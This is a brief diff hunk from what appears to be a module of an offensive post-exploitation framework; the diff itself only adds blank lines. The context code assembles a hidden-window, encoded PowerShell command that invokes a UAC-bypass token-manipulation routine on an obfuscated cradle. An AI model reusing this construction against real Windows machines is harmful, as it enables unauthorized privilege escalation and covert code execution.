@@ -168,4 +168,6 @@ class Module(object):
                                           obfuscationCommand=obfuscationCommand)
         scriptEnd = "Invoke-BypassUACTokenManipulation -Arguments \"-w 1 -enc %s\"" % (encoded_cradle)
         script += scriptEnd
+
         return script
+
